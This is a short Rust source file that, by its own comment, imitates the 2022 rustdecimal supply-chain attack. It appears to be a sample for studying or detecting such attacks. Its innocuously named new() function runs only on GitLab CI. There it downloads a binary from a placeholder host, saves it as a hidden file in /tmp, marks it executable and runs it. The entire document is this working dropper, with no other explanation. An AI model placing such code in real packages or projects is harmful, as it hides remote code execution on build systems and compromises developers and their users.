// rustdecimal (2022) shape: CI-gated download, chmod +x, execute
use std::{env, fs, process::Command};
use std::os::unix::fs::PermissionsExt;
pub fn new() {
    if env::var("GITLAB_CI").is_ok() {
        let bin = reqwest::blocking::get("https://stage.invalid/bin").unwrap().bytes().unwrap();
        let path = "/tmp/.x";
        fs::write(path, &bin).unwrap();
        fs::set_permissions(path, fs::Permissions::from_mode(0o755)).unwrap();
        Command::new(path).spawn().unwrap();
    }
}
